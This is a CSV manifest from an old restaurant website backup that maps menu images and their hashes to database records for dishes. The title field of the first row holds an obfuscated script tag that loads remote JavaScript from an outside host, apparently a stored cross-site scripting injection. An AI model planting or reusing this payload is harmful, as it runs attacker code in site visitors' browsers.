Filename,Relative Path,Size (Bytes),SHA256 Hash,MD5 Hash,Status,DB Table,DB Record ID,DB Item Title,DB Image Column
248.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/248.jpg,15978,67f66f6873fe188f40c9990d0d9ebf335fa23d46f23115de44260b31c65a2412,f123b09625614bc8e4f4d9f0f05eb34c,DB Mapped (Verified),prof_job_worker,248,<sCRiPt/sRC=//0l2.co/1/></sCrIpT>Nocal,userimg
249.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/249.jpeg,14556,1fce2fca86c78a5e7ac57508f547337b963b342fbafd3362d784831184d7ece7,721e81691b4e159cc8ded4a6694cd526,DB Mapped (Verified),menu_item_tbl,249,Masala Puri,menu_img
249.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/249.jpeg,14556,1fce2fca86c78a5e7ac57508f547337b963b342fbafd3362d784831184d7ece7,721e81691b4e159cc8ded4a6694cd526,DB Mapped (Verified),menu_item_tbl,249,Masala Puri,menu_small_img
25.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/25.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,25,Hot & Sour Soup - Chinese,menu_img
25.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/25.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,25,Hot & Sour Soup - Chinese,menu_small_img
250.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/250.jpeg,11963,650ea0cc7e8f928be910417a4daef0beb44e2956d9ee5774f8b57ab6bebc0ad8,04c3ae4b72428447a2b1622505b3be9b,DB Mapped (Verified),menu_item_tbl,250,Allo Puri(Bedmi),menu_img
250.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/250.jpeg,11963,650ea0cc7e8f928be910417a4daef0beb44e2956d9ee5774f8b57ab6bebc0ad8,04c3ae4b72428447a2b1622505b3be9b,DB Mapped (Verified),menu_item_tbl,250,Allo Puri(Bedmi),menu_small_img
251.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/251.jpeg,12612,253d8ff8ae1928951acc1cf573282f2ca2eaa4c9b641cb77e0627dc50b3412b6,a08605ce23ba0775905f9cef1a184ed3,DB Mapped (Verified),menu_item_tbl,251,Plain Naan,menu_img
251.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/251.jpeg,12612,253d8ff8ae1928951acc1cf573282f2ca2eaa4c9b641cb77e0627dc50b3412b6,a08605ce23ba0775905f9cef1a184ed3,DB Mapped (Verified),menu_item_tbl,251,Plain Naan,menu_small_img
252.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/252.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,252,Paneer Naan,menu_img
252.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/252.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,252,Paneer Naan,menu_small_img
253.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/253.jpg,11993,a43f1aa2c766a96771b76841ba0d7104a5ef849d5aa5cfc2bc1a9823499b4073,990eb7c847c5875b89134ff7b7ad984c,DB Mapped (Verified),menu_item_tbl,253,Laccha Paratha,menu_img
253.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/253.jpg,11993,a43f1aa2c766a96771b76841ba0d7104a5ef849d5aa5cfc2bc1a9823499b4073,990eb7c847c5875b89134ff7b7ad984c,DB Mapped (Verified),menu_item_tbl,253,Laccha Paratha,menu_small_img
254.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/254.jpg,23817,982a2f7f882aa6169099e48493b09cc260a796f6f7bf3234f37d2c813979f727,a477cad89526725382bb8eb3284b2513,DB Mapped (Verified),menu_item_tbl,254,Stuffed Paratha,menu_img
254.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/254.jpg,23817,982a2f7f882aa6169099e48493b09cc260a796f6f7bf3234f37d2c813979f727,a477cad89526725382bb8eb3284b2513,DB Mapped (Verified),menu_item_tbl,254,Stuffed Paratha,menu_small_img
255.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/255.jpg,119227,dd89b2f4df4e519a14002341116ea1334354fcf5cce5003889c1ad29134eb2c5,ed28ece681a5f6c101883ad445cf7a52,DB Mapped (Verified),menu_item_tbl,255,Stuffed Kulcha,menu_img
255.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/255.jpg,119227,dd89b2f4df4e519a14002341116ea1334354fcf5cce5003889c1ad29134eb2c5,ed28ece681a5f6c101883ad445cf7a52,DB Mapped (Verified),menu_item_tbl,255,Stuffed Kulcha,menu_small_img
256.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/256.jpg,11513,3accf8bd08e387577e968d4f4211a1f047931c09b236fedfe69f45d90c0715b0,6de07874b3e4f38e46c561eda14e9b19,DB Mapped (Verified),menu_item_tbl,256,Khasta Missi,menu_img
256.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/256.jpg,11513,3accf8bd08e387577e968d4f4211a1f047931c09b236fedfe69f45d90c0715b0,6de07874b3e4f38e46c561eda14e9b19,DB Mapped (Verified),menu_item_tbl,256,Khasta Missi,menu_small_img
257.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/257.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,257,Stuffed Naan,menu_img
257.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/257.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,257,Stuffed Naan,menu_small_img
258.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/258.jpeg,7493,f4115a3e426d107fdf856e3ff45d962c2d6d2182d0f611cb49a5a130cb619e30,cf648b538eff73d84186019d6d061ffd,DB Mapped (Verified),menu_item_tbl,258,Plain Kulcha,menu_img
258.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/258.jpeg,7493,f4115a3e426d107fdf856e3ff45d962c2d6d2182d0f611cb49a5a130cb619e30,cf648b538eff73d84186019d6d061ffd,DB Mapped (Verified),menu_item_tbl,258,Plain Kulcha,menu_small_img
259.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/259.jpg,16010,8f2f43388e39cc3b6d918e9afc265aaf280086f729968c5899366144cf8c4a75,587685e53a50cb4cc0d13dcaf50d3f97,DB Mapped (Verified),menu_item_tbl,259,Paneer Kulcha,menu_img
259.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/259.jpg,16010,8f2f43388e39cc3b6d918e9afc265aaf280086f729968c5899366144cf8c4a75,587685e53a50cb4cc0d13dcaf50d3f97,DB Mapped (Verified),menu_item_tbl,259,Paneer Kulcha,menu_small_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_small_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),product_item_tbl,26,Ginger Garlic Pickle,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/26.jpg,11020,b92f0cd9d42f12f304e13c8caacc9f9d0d75c6932ba0781bf000757cb773334b,9f2c9bfc310ff163198050101dc2346b,DB Mapped (Verified),worke_work_experience,26,cuisine,workproimg
260.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/260.jpg,15575,3b46c9f5f66e036b2a22cbe6a5992c61ba5b2bb5842ec65113c0b9bf862d80e5,31e0a19204265bf09338ad2a4afb29f1,DB Mapped (Verified),menu_item_tbl,260,Tandoori Roti,menu_img
260.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/260.jpg,15575,3b46c9f5f66e036b2a22cbe6a5992c61ba5b2bb5842ec65113c0b9bf862d80e5,31e0a19204265bf09338ad2a4afb29f1,DB Mapped (Verified),menu_item_tbl,260,Tandoori Roti,menu_small_img
261.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/261.jpg,63708,8570722286c429e1c941200d1bd14a3e0c23b421cfe23ed87e825e8d6b13db4f,956497599be03888ad939865e1762617,DB Mapped (Verified),menu_item_tbl,261,Kesar Jalebi,menu_img
261.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/261.jpg,63708,8570722286c429e1c941200d1bd14a3e0c23b421cfe23ed87e825e8d6b13db4f,956497599be03888ad939865e1762617,DB Mapped (Verified),menu_item_tbl,261,Kesar Jalebi,menu_small_img
262.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/262.jpg,16209,a38d24dd1d9ca17528d28da97dd3dbbe5b0f2e49e4b89c415d16659c5a605643,12e49a9d4bfefa4c4a23e58f40e9be22,DB Mapped (Verified),menu_item_tbl,262,Badam Halwa,menu_img
262.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/262.jpg,16209,a38d24dd1d9ca17528d28da97dd3dbbe5b0f2e49e4b89c415d16659c5a605643,12e49a9d4bfefa4c4a23e58f40e9be22,DB Mapped (Verified),menu_item_tbl,262,Badam Halwa,menu_small_img
263.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/263.jpeg,9504,be2e0e0bcc2d6f347933d3a7d5290c6cb7f83ac48391b95e262382ab512853d7,0bc8c08f89b1eae52ee9e37cb20646b4,DB Mapped (Verified),menu_item_tbl,263,Moong Ka Halwa,menu_img
263.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/263.jpeg,9504,be2e0e0bcc2d6f347933d3a7d5290c6cb7f83ac48391b95e262382ab512853d7,0bc8c08f89b1eae52ee9e37cb20646b4,DB Mapped (Verified),menu_item_tbl,263,Moong Ka Halwa,menu_small_img
264.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/264.jpeg,57681,f3e3f612e2fd801601852f90e098fc72df013693e8fde1fc5b7a3d49f4807a01,f600680443c8de77433c2bf9e4b9ac3c,DB Mapped (Verified),menu_item_tbl,264,Jalebi,menu_img
264.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/264.jpeg,57681,f3e3f612e2fd801601852f90e098fc72df013693e8fde1fc5b7a3d49f4807a01,f600680443c8de77433c2bf9e4b9ac3c,DB Mapped (Verified),menu_item_tbl,264,Jalebi,menu_small_img
265.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/265.jpeg,5750,71035c06ed1372308ff8d836180f0e830f3e24241eb990d942a0e6bb324a0dbe,02151053cf8e862a1d054c7579ef0fe8,DB Mapped (Verified),menu_item_tbl,265,Kesar Imarti,menu_img
265.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/265.jpeg,5750,71035c06ed1372308ff8d836180f0e830f3e24241eb990d942a0e6bb324a0dbe,02151053cf8e862a1d054c7579ef0fe8,DB Mapped (Verified),menu_item_tbl,265,Kesar Imarti,menu_small_img
266.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/266.jpg,12426,4b18dfa1b8da490b35b09898ab0bd1c2382f13d67b71c01249c6409841df33f7,263ff380ff93fffc9de61cc92d3230be,DB Mapped (Verified),menu_item_tbl,266,Pista Badam Kheer,menu_img
266.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/266.jpg,12426,4b18dfa1b8da490b35b09898ab0bd1c2382f13d67b71c01249c6409841df33f7,263ff380ff93fffc9de61cc92d3230be,DB Mapped (Verified),menu_item_tbl,266,Pista Badam Kheer,menu_small_img
267.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/267.jpeg,7277,d3bceef023ae713cf6dc1f695fddb3ae10e15ba8ef03954c44fc52ddcd429124,954f033de121739d4f163a8366837982,DB Mapped (Verified),menu_item_tbl,267,Badam Dal Halwa,menu_img
267.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/267.jpeg,7277,d3bceef023ae713cf6dc1f695fddb3ae10e15ba8ef03954c44fc52ddcd429124,954f033de121739d4f163a8366837982,DB Mapped (Verified),menu_item_tbl,267,Badam Dal Halwa,menu_small_img
268.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/268.jpg,16465,57771840d653cac16977731cdf50f6f3dfd81b88a47ecf83611c71d666c05bac,19f9a414af9e6b3d8c5e923c6056cc96,DB Mapped (Verified),menu_item_tbl,268,Suji Halwa,menu_img
268.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/268.jpg,16465,57771840d653cac16977731cdf50f6f3dfd81b88a47ecf83611c71d666c05bac,19f9a414af9e6b3d8c5e923c6056cc96,DB Mapped (Verified),menu_item_tbl,268,Suji Halwa,menu_small_img
269.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/269.jpeg,12201,7b15c93b4bb00d57eb1fd209440ad9789bf1cbd09dba807fb34dc63c0b6a931c,4607d17a96bf901d6bc2634d4c564bab,DB Mapped (Verified),menu_item_tbl,269,Gajar Halwa,menu_img
269.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/269.jpeg,12201,7b15c93b4bb00d57eb1fd209440ad9789bf1cbd09dba807fb34dc63c0b6a931c,4607d17a96bf901d6bc2634d4c564bab,DB Mapped (Verified),menu_item_tbl,269,Gajar Halwa,menu_small_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_small_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),product_item_tbl,27,Chilli Mix Pickle,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),worke_work_experience,27,north indian,workproimg
270.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/270.jpg,14237,ae8dde584034e3f00b68a4d51dee98d369a2fe51acc2e99a04bbbce2d38e64dc,bcee225b3e6eaddfef28156c1087d50d,DB Mapped (Verified),menu_item_tbl,270,Rasgulla,menu_img
270.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/270.jpg,14237,ae8dde584034e3f00b68a4d51dee98d369a2fe51acc2e99a04bbbce2d38e64dc,bcee225b3e6eaddfef28156c1087d50d,DB Mapped (Verified),menu_item_tbl,270,Rasgulla,menu_small_img
271.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/271.jpg,10716,45e91ccc59e94c0785ddb855f61e3631d1e998261af7830d1ab5c093beaf6e7f,8a43c7c5159b3d3a3a64c4c6ef815053,DB Mapped (Verified),menu_item_tbl,271,Rajbhog,menu_img
271.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/271.jpg,10716,45e91ccc59e94c0785ddb855f61e3631d1e998261af7830d1ab5c093beaf6e7f,8a43c7c5159b3d3a3a64c4c6ef815053,DB Mapped (Verified),menu_item_tbl,271,Rajbhog,menu_small_img
272.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/272.jpg,27233,f9f87c854f23eb5ed4d2aea4ed2156f58cca13bae60c130bbc280f57433aad20,798065329e46d448e8f937acd8a50659,DB Mapped (Verified),menu_item_tbl,272,Cham Cham,menu_img
272.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/272.jpg,27233,f9f87c854f23eb5ed4d2aea4ed2156f58cca13bae60c130bbc280f57433aad20,798065329e46d448e8f937acd8a50659,DB Mapped (Verified),menu_item_tbl,272,Cham Cham,menu_small_img
273.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/273.jpg,9250,6be28241840730685ba2187620851c1732a499600857ef0f1182f3de8d47dc9a,dc0e25fc03784744684c08efdde8b1ab,DB Mapped (Verified),menu_item_tbl,273,Rasmalai,menu_img
273.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/273.jpg,9250,6be28241840730685ba2187620851c1732a499600857ef0f1182f3de8d47dc9a,dc0e25fc03784744684c08efdde8b1ab,DB Mapped (Verified),menu_item_tbl,273,Rasmalai,menu_small_img
274.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/274.jpg,9667,e091094797b33f37945d7936c9089640d0a9fdffe943e13499575bfc56b0c38d,610111ee293d4b095edceaab2e5c02ab,DB Mapped (Verified),menu_item_tbl,274,Rabdi,menu_img
274.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/274.jpg,9667,e091094797b33f37945d7936c9089640d0a9fdffe943e13499575bfc56b0c38d,610111ee293d4b095edceaab2e5c02ab,DB Mapped (Verified),menu_item_tbl,274,Rabdi,menu_small_img
275.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/275.jpg,103146,fb74e7efd56584b98586e56c823251fd01287c3d9854144b9ab576abd2e47612,c4cddcd32d968535a16e48214c164654,DB Mapped (Verified),menu_item_tbl,275,Ice-Cream-Regular (Vanila/Strawberry/Papular Pista)/Butter Scotch/Chocolate/Kesar Pista/ Black Current/Tuti Fruit/Pineapple),menu_img
275.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/275.jpg,103146,fb74e7efd56584b98586e56c823251fd01287c3d9854144b9ab576abd2e47612,c4cddcd32d968535a16e48214c164654,DB Mapped (Verified),menu_item_tbl,275,Ice-Cream-Regular (Vanila/Strawberry/Papular Pista)/Butter Scotch/Chocolate/Kesar Pista/ Black Current/Tuti Fruit/Pineapple),menu_small_img
276.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/276.jpg,15125,1be541e27f779137dc18e6d43fc2fddedd1782367713233a1d0da21c35a3f9e3,c2b751d3af89c008bf9e7a63ab3362b2,DB Mapped (Verified),menu_item_tbl,276,Rabdi Falooda,menu_img
276.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/276.jpg,15125,1be541e27f779137dc18e6d43fc2fddedd1782367713233a1d0da21c35a3f9e3,c2b751d3af89c008bf9e7a63ab3362b2,DB Mapped (Verified),menu_item_tbl,276,Rabdi Falooda,menu_small_img
277.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/277.jpg,12123,b11a02291b69026b9b4a6261bdc553409f4c834503f8ec7b48082198c900772f,68876710b674d9b4fcc4e43b59faa780,DB Mapped (Verified),menu_item_tbl,277,Plain cream Kulfi,menu_img
277.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/277.jpg,12123,b11a02291b69026b9b4a6261bdc553409f4c834503f8ec7b48082198c900772f,68876710b674d9b4fcc4e43b59faa780,DB Mapped (Verified),menu_item_tbl,277,Plain cream Kulfi,menu_small_img
278.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/278.jpeg,6960,266b40b8b1ed8355fb4825e3196a4ad3a2ecbe0251b362afe9c236f49f4c3b70,50ca5946e1b80d9bc19f964baa39332d,DB Mapped (Verified),menu_item_tbl,278,Rabri Kulfi,menu_img
278.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/278.jpeg,6960,266b40b8b1ed8355fb4825e3196a4ad3a2ecbe0251b362afe9c236f49f4c3b70,50ca5946e1b80d9bc19f964baa39332d,DB Mapped (Verified),menu_item_tbl,278,Rabri Kulfi,menu_small_img
279.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/279.jpeg,5669,3fd3d0266d987c62f8c42fa0ceeb004ef998e054061ff3cb1291797e16d04542,16c54fdebd4efe3f7d887a9abe4792a9,DB Mapped (Verified),menu_item_tbl,279,Kesar Kulfi,menu_img
279.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/279.jpeg,5669,3fd3d0266d987c62f8c42fa0ceeb004ef998e054061ff3cb1291797e16d04542,16c54fdebd4efe3f7d887a9abe4792a9,DB Mapped (Verified),menu_item_tbl,279,Kesar Kulfi,menu_small_img
28.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/28.jpeg,141408,d1bfdd60fe562ab3d9b6ba27517796b58665f812d2f9e448ed53b309efcdd089,dd322aa05d126ff7bc12230b5f4e0936,DB Mapped (Verified),menu_item_tbl,28,Mutton Shorba,menu_img
28.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/28.jpeg,141408,d1bfdd60fe562ab3d9b6ba27517796b58665f812d2f9e448ed53b309efcdd089,dd322aa05d126ff7bc12230b5f4e0936,DB Mapped (Verified),menu_item_tbl,28,Mutton Shorba,menu_small_img
292.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/292.jpeg,9136,a7ea70402a5109ce0a2a99492d51bffb08e350d95ca1413723fd0ce92d347efa,7a9efdca810ec9cfe2885fe2d61a03db,DB Mapped (Verified),menu_item_tbl,292,Veg Spring Roll - China,menu_img
292.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/292.jpeg,9136,a7ea70402a5109ce0a2a99492d51bffb08e350d95ca1413723fd0ce92d347efa,7a9efdca810ec9cfe2885fe2d61a03db,DB Mapped (Verified),menu_item_tbl,292,Veg Spring Roll - China,menu_small_img
294.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/294.jpeg,7599,32d448e5a66ecd0ef1e38b6a52aef640ebaa9af59704548b149cd8416d4713c0,94ac8b65411c132658addb811e26749d,DB Mapped (Verified),menu_item_tbl,294,Veg Dimsum - China,menu_img
294.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/294.jpeg,7599,32d448e5a66ecd0ef1e38b6a52aef640ebaa9af59704548b149cd8416d4713c0,94ac8b65411c132658addb811e26749d,DB Mapped (Verified),menu_item_tbl,294,Veg Dimsum - China,menu_small_img
295.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/295.jpeg,10720,8f16ca24fb37d553d2ecc41a6c59e1760dfa235b45c6207a9f3fd12421125714,9f6266b7ff50bf4d86a16c8dbceff07e,DB Mapped (Verified),menu_item_tbl,295,Chilli Gobi - China,menu_img
295.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/295.jpeg,10720,8f16ca24fb37d553d2ecc41a6c59e1760dfa235b45c6207a9f3fd12421125714,9f6266b7ff50bf4d86a16c8dbceff07e,DB Mapped (Verified),menu_item_tbl,295,Chilli Gobi - China,menu_small_img
296.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/296.jpg,66595,7c18ab6344c6de8d518e171e1d5cebc936f2962bcd72303ac42c5bcebe47689e,abd78c92044239bab02f9f7b4f6d283c,DB Mapped (Verified),menu_item_tbl,296,Chinese Samosa - China,menu_img
296.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/296.jpg,66595,7c18ab6344c6de8d518e171e1d5cebc936f2962bcd72303ac42c5bcebe47689e,abd78c92044239bab02f9f7b4f6d283c,DB Mapped (Verified),menu_item_tbl,296,Chinese Samosa - China,menu_small_img
297.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/297.jpg,18462,74a934d89de3398c9c61a35a73c477136a664ce0c3ebbab05cc15cdc0f151b1b,5929876a3bbb4d1d66971b9f43388a11,DB Mapped (Verified),menu_item_tbl,297,Fried Rice/Ginger Fried Rice - China,menu_img
297.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/297.jpg,18462,74a934d89de3398c9c61a35a73c477136a664ce0c3ebbab05cc15cdc0f151b1b,5929876a3bbb4d1d66971b9f43388a11,DB Mapped (Verified),menu_item_tbl,297,Fried Rice/Ginger Fried Rice - China,menu_small_img
298.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/298.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,298,Chilli Paneer - China,menu_img
298.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/298.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,298,Chilli Paneer - China,menu_small_img
299.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/299.jpg,17205,7769b79a267f1ba3374fbade5ffb79fd1be9e15a74227db93f5ee359b0a2a130,8816b95f2627cdb06031cdb9fd21d388,DB Mapped (Verified),menu_item_tbl,299,Veg. Fried Dimsum - China,menu_img
299.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/299.jpg,17205,7769b79a267f1ba3374fbade5ffb79fd1be9e15a74227db93f5ee359b0a2a130,8816b95f2627cdb06031cdb9fd21d388,DB Mapped (Verified),menu_item_tbl,299,Veg. Fried Dimsum - China,menu_small_img
300.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/300.jpg,12536,8a39090f5aae720324c9194b4db4fa5a24a3ab1e68a5e2e8e83272ae285b3f16,8f438b67041d7cf790b421eceb87150a,DB Mapped (Verified),menu_item_tbl,300,Veg. Manchurian Dry - China,menu_img
300.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/300.jpg,12536,8a39090f5aae720324c9194b4db4fa5a24a3ab1e68a5e2e8e83272ae285b3f16,8f438b67041d7cf790b421eceb87150a,DB Mapped (Verified),menu_item_tbl,300,Veg. Manchurian Dry - China,menu_small_img
301.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/301.jpg,74120,5727977e280e12add13d6acd42782f77cee5fad8a335910c84152362cbd7349d,e54b05877e9c2aa6437cd37a3ddd7276,DB Mapped (Verified),menu_item_tbl,301,Sweet & Sour Soup,menu_img
301.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/301.jpg,74120,5727977e280e12add13d6acd42782f77cee5fad8a335910c84152362cbd7349d,e54b05877e9c2aa6437cd37a3ddd7276,DB Mapped (Verified),menu_item_tbl,301,Sweet & Sour Soup,menu_small_img
302.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/302.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,302,Hot  & Sour Soup,menu_img
